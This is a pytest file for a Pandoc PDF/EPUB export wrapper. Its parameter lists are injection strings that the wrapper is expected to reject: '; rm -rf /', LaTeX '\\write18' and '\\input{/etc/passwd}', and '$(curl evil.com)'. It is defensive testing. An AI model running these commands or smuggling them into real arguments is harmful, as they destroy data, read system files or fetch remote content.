"""Tests for the Pandoc export wrapper.

Audit M1 (#117): pandoc forwards LaTeX, and xelatex respects
``-shell-escape``. Without an allowlist, ``pdf_engine``, ``font``,
``font_size``, and ``margin`` flow into the argv list and can carry
LaTeX injection (``\\input{/etc/passwd}``, ``\\write18{...}``) or
shell-escape pivots. Tests pin the allowlist contract before
subprocess is ever called.

Issue #124: additional tests to cover check_pandoc, check_calibre,
generate_epub, generate_mobi, assemble_manuscript, and _human_size.
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from tools.export import pandoc


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


@pytest.fixture
def mock_subprocess(tmp_path: Path):
    """Mock subprocess.run so tests never actually call pandoc.

    The fake run returns a successful CompletedProcess and pretends the
    output file was written, so generate_pdf's success path completes.
    """
    output = tmp_path / "out.pdf"

    def fake_run(cmd, *args, **kwargs):
        # Pretend pandoc wrote the file
        out_idx = cmd.index("-o") + 1
        Path(cmd[out_idx]).write_bytes(b"%PDF-1.5\nfake\n")
        result = MagicMock()
        result.returncode = 0
        result.stderr = ""
        result.stdout = ""
        return result

    with patch.object(pandoc.subprocess, "run", side_effect=fake_run) as mock:
        yield mock, output


# ---------------------------------------------------------------------------
# pdf_engine allowlist
# ---------------------------------------------------------------------------


class TestPdfEngineAllowlist:
    @pytest.mark.parametrize("engine", ["xelatex", "lualatex", "pdflatex", "tectonic"])
    def test_accepts_known_engine(self, engine, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", pdf_engine=engine)
        assert result["success"] is True
        # The engine flag must be passed verbatim
        cmd = mock_run.call_args[0][0]
        assert f"--pdf-engine={engine}" in cmd

    @pytest.mark.parametrize(
        "evil_engine",
        [
            "--shell-escape",
            "xelatex --shell-escape",
            "; rm -rf /",
            "../escape",
            "xelatex; touch /tmp/pwn",
            "fake_engine",
        ],
    )
    def test_rejects_unknown_or_unsafe_engine(self, evil_engine, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", pdf_engine=evil_engine)
        assert result["success"] is False
        assert "error" in result
        # subprocess must never have been called
        mock_run.assert_not_called()


# ---------------------------------------------------------------------------
# font character whitelist
# ---------------------------------------------------------------------------


class TestFontValidation:
    @pytest.mark.parametrize(
        "font",
        [
            "Linux Libertine O",
            "EB Garamond",
            "DejaVu Serif",
            "Latin Modern Roman",
            "Source Sans Pro",
            "Times New Roman",
            "Crimson Text",
            "Noto Serif",
        ],
    )
    def test_accepts_legitimate_font(self, font, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", font=font)
        assert result["success"] is True

    @pytest.mark.parametrize(
        "evil_font",
        [
            "; \\input{/etc/passwd}",
            "\\write18{rm -rf /}",
            "$(curl evil.com)",
            "Linux\nLibertine",
            "Font; \\immediate\\write18{ls}",
            "{evil}",
            "font|cat",
            "../escape",
        ],
    )
    def test_rejects_unsafe_font(self, evil_font, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", font=evil_font)
        assert result["success"] is False
        assert "error" in result
        mock_run.assert_not_called()


# ---------------------------------------------------------------------------
# font_size and margin format
# ---------------------------------------------------------------------------


class TestFontSizeValidation:
    @pytest.mark.parametrize("size", ["10pt", "11pt", "12pt", "9pt", "14pt"])
    def test_accepts_valid_size(self, size, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", font_size=size)
        assert result["success"] is True

    @pytest.mark.parametrize(
        "evil_size",
        [
            "11pt; \\input{x}",
            "11",  # missing unit
            "100pt",  # absurd
            "11px",  # wrong unit
            "-11pt",
            "$(echo 11)pt",
        ],
    )
    def test_rejects_unsafe_size(self, evil_size, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", font_size=evil_size)
        assert result["success"] is False
        mock_run.assert_not_called()


class TestMarginValidation:
    @pytest.mark.parametrize("margin", ["1in", "2.5cm", "20mm", "0.5in", "1.25in", "30mm"])
    def test_accepts_valid_margin(self, margin, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", margin=margin)
        assert result["success"] is True

    @pytest.mark.parametrize(
        "evil_margin",
        [
            "1in; \\write18{ls}",
            "1",  # missing unit
            "100in",  # absurd
            "1foo",  # wrong unit
            "$(rm)in",
            "../1in",
        ],
    )
    def test_rejects_unsafe_margin(self, evil_margin, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", margin=evil_margin)
        assert result["success"] is False
        mock_run.assert_not_called()


# ---------------------------------------------------------------------------
# Defaults still work
# ---------------------------------------------------------------------------


class TestDefaults:
    def test_default_args_succeed(self, mock_subprocess, tmp_path: Path):
        """Control: calling with no overrides uses defaults that pass."""
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A")
        assert result["success"] is True
        cmd = mock_run.call_args[0][0]
        assert "--pdf-engine=xelatex" in cmd
        assert any("mainfont=Linux Libertine O" in c for c in cmd)
        assert any("fontsize=11pt" in c for c in cmd)
        assert any("geometry:margin=1in" in c for c in cmd)


# ---------------------------------------------------------------------------
# check_pandoc / check_calibre
# ---------------------------------------------------------------------------


@pytest.fixture
def mock_subprocess_run():
    """Generic subprocess.run mock."""
    with patch.object(pandoc.subprocess, "run") as mock:
        yield mock


class TestCheckPandoc:
    def test_installed(self, mock_subprocess_run):
        mock_subprocess_run.return_value = MagicMock(stdout="pandoc 3.1\n", returncode=0)
        result = pandoc.check_pandoc()
        assert result["installed"] is True
        assert "pandoc" in result["version"]

    def test_not_installed(self, mock_subprocess_run):
        mock_subprocess_run.side_effect = FileNotFoundError
        result = pandoc.check_pandoc()
        assert result["installed"] is False
        assert result["version"] is None

    def test_timeout(self, mock_subprocess_run):
        mock_subprocess_run.side_effect = pandoc.subprocess.TimeoutExpired("pandoc", 10)
        result = pandoc.check_pandoc()
        assert result["installed"] is False

    def test_empty_stdout(self, mock_subprocess_run):
        mock_subprocess_run.return_value = MagicMock(stdout="", returncode=0)
        result = pandoc.check_pandoc()
        assert result["installed"] is True
        assert result["version"] == "unknown"


class TestCheckCalibre:
    def test_installed(self, mock_subprocess_run):
        mock_subprocess_run.return_value = MagicMock(stdout="ebook-convert 6.0\n", returncode=0)
        result = pandoc.check_calibre()
        assert result["installed"] is True

    def test_not_installed(self, mock_subprocess_run):
        mock_subprocess_run.side_effect = FileNotFoundError
        result = pandoc.check_calibre()
        assert result["installed"] is False
        assert result["version"] is None

    def test_timeout(self, mock_subprocess_run):
        mock_subprocess_run.side_effect = pandoc.subprocess.TimeoutExpired("ebook-convert", 10)
        result = pandoc.check_calibre()
        assert result["installed"] is False

    def test_empty_stdout(self, mock_subprocess_run):
        mock_subprocess_run.return_value = MagicMock(stdout="", returncode=0)
        result = pandoc.check_calibre()
        assert result["version"] == "unknown"


# ---------------------------------------------------------------------------
# generate_epub
# ---------------------------------------------------------------------------


@pytest.fixture
def mock_epub_subprocess(tmp_path: Path):
    output = tmp_path / "out.epub"

    def fake_run(cmd, *args, **kwargs):
        out_idx = cmd.index("-o") + 1
        Path(cmd[out_idx]).write_bytes(b"PK fake epub")
        result = MagicMock()
        result.returncode = 0
        result.stderr = ""
        return result

    with patch.object(pandoc.subprocess, "run", side_effect=fake_run) as mock:
        yield mock, output


class TestGenerateEpub:
    def test_success(self, mock_epub_subprocess, tmp_path: Path):
        mock_run, output = mock_epub_subprocess
        result = pandoc.generate_epub(tmp_path / "in.md", output, "My Book", "Author")
        assert result["success"] is True
        assert "path" in result
        assert result["size_bytes"] > 0

    def test_includes_metadata_flags(self, mock_epub_subprocess, tmp_path: Path):
        mock_run, output = mock_epub_subprocess
        pandoc.generate_epub(tmp_path / "in.md", output, "My Book", "Test Author", language="de")
        cmd = mock_run.call_args[0][0]
        assert "title=My Book" in " ".join(cmd)
        assert "author=Test Author" in " ".join(cmd)
        assert "lang=de" in " ".join(cmd)

    def test_cover_image_included_when_exists(self, mock_epub_subprocess, tmp_path: Path):
        mock_run, output = mock_epub_subprocess
        cover = tmp_path / "cover.jpg"
        cover.write_bytes(b"fake image")
        pandoc.generate_epub(tmp_path / "in.md", output, "T", "A", cover_image=cover)
        cmd = mock_run.call_args[0][0]
        assert "--epub-cover-image" in cmd

    def test_cover_image_skipped_when_missing(self, mock_epub_subprocess, tmp_path: Path):
        mock_run, output = mock_epub_subprocess
        pandoc.generate_epub(tmp_path / "in.md", output, "T", "A", cover_image=tmp_path / "nope.jpg")
        cmd = mock_run.call_args[0][0]
        assert "--epub-cover-image" not in cmd

    def test_failure_returns_error(self, tmp_path: Path):
        def fail_run(cmd, *args, **kwargs):
            result = MagicMock()
            result.returncode = 1
            result.stderr = "pandoc error"
            return result

        with patch.object(pandoc.subprocess, "run", side_effect=fail_run):
            result = pandoc.generate_epub(tmp_path / "in.md", tmp_path / "out.epub", "T", "A")
        assert result["success"] is False
        assert "error" in result


# ---------------------------------------------------------------------------
# generate_pdf — failure path
# ---------------------------------------------------------------------------


class TestGeneratePdfFailure:
    def test_pandoc_failure_returns_error(self, tmp_path: Path):
        def fail_run(cmd, *args, **kwargs):
            result = MagicMock()
            result.returncode = 1
            result.stderr = "xelatex not found"
            return result

        with patch.object(pandoc.subprocess, "run", side_effect=fail_run):
            result = pandoc.generate_pdf(tmp_path / "in.md", tmp_path / "out.pdf", "T", "A")
        assert result["success"] is False
        assert "xelatex not found" in result["error"]


# ---------------------------------------------------------------------------
# generate_mobi
# ---------------------------------------------------------------------------


class TestGenerateMobi:
    def test_epub_not_found(self, tmp_path: Path):
        result = pandoc.generate_mobi(tmp_path / "missing.epub", tmp_path / "out.mobi")
        assert result["success"] is False
        assert "not found" in result["error"]

    def test_success(self, tmp_path: Path):
        epub = tmp_path / "book.epub"
        epub.write_bytes(b"PK fake epub")
        output = tmp_path / "out.mobi"

        def fake_run(cmd, *args, **kwargs):
            Path(cmd[-1]).write_bytes(b"fake mobi")
            result = MagicMock()
            result.returncode = 0
            result.stderr = ""
            return result

        with patch.object(pandoc.subprocess, "run", side_effect=fake_run):
            result = pandoc.generate_mobi(epub, output)
        assert result["success"] is True
        assert result["size_bytes"] > 0

    def test_failure(self, tmp_path: Path):
        epub = tmp_path / "book.epub"
        epub.write_bytes(b"PK fake")

        def fail_run(cmd, *args, **kwargs):
            result = MagicMock()
            result.returncode = 1
            result.stderr = "conversion failed"
            return result

        with patch.object(pandoc.subprocess, "run", side_effect=fail_run):
            result = pandoc.generate_mobi(epub, tmp_path / "out.mobi")
        assert result["success"] is False


# ---------------------------------------------------------------------------
# assemble_manuscript
# ---------------------------------------------------------------------------


class TestAssembleManuscript:
    def _make_project(self, tmp_path: Path) -> Path:
        project = tmp_path / "my-book"
        (project / "chapters" / "01-intro").mkdir(parents=True)
        (project / "chapters" / "02-conflict").mkdir()
        (project / "chapters" / "01-intro" / "draft.md").write_text(
            "Chapter one content.", encoding="utf-8"
        )
        (project / "chapters" / "02-conflict" / "draft.md").write_text(
            "Chapter two content.", encoding="utf-8"
        )
        return project

    def test_includes_all_chapters(self, tmp_path: Path):
        project = self._make_project(tmp_path)
        output = tmp_path / "manuscript.md"
        result = pandoc.assemble_manuscript(project, output)
        assert result["chapters_included"] == 2
        text = output.read_text(encoding="utf-8")
        assert "Chapter one content." in text
        assert "Chapter two content." in text

    def test_includes_front_matter(self, tmp_path: Path):
        project = self._make_project(tmp_path)
        (project / "export").mkdir()
        (project / "export" / "front-matter.md").write_text(
            "---\ntitle: Test\n---\n\nDedication page.", encoding="utf-8"
        )
        output = tmp_path / "manuscript.md"
        pandoc.assemble_manuscript(project, output)
        text = output.read_text(encoding="utf-8")
        assert "Dedication page." in text

    def test_includes_back_matter(self, tmp_path: Path):
        project = self._make_project(tmp_path)
        (project / "export").mkdir()
        (project / "export" / "back-matter.md").write_text(
            "About the author.", encoding="utf-8"
        )
        output = tmp_path / "manuscript.md"
        pandoc.assemble_manuscript(project, output)
        text = output.read_text(encoding="utf-8")
        assert "About the author." in text

    def test_word_count_returned(self, tmp_path: Path):
        project = self._make_project(tmp_path)
        output = tmp_path / "manuscript.md"
        result = pandoc.assemble_manuscript(project, output)
        assert result["word_count"] > 0

    def test_empty_project_no_chapters(self, tmp_path: Path):
        project = tmp_path / "empty-book"
        (project / "chapters").mkdir(parents=True)
        output = tmp_path / "manuscript.md"
        result = pandoc.assemble_manuscript(project, output)
        assert result["chapters_included"] == 0

    def test_creates_output_parent_dirs(self, tmp_path: Path):
        project = self._make_project(tmp_path)
        output = tmp_path / "deep" / "nested" / "out.md"
        pandoc.assemble_manuscript(project, output)
        assert output.exists()


# ---------------------------------------------------------------------------
# _human_size
# ---------------------------------------------------------------------------


class TestHumanSize:
    def test_bytes(self):
        assert pandoc._human_size(500) == "500.0 B"

    def test_kilobytes(self):
        assert pandoc._human_size(2048) == "2.0 KB"

    def test_megabytes(self):
        assert pandoc._human_size(3 * 1024 * 1024) == "3.0 MB"

    def test_gigabytes(self):
        assert pandoc._human_size(2 * 1024 * 1024 * 1024) == "2.0 GB"
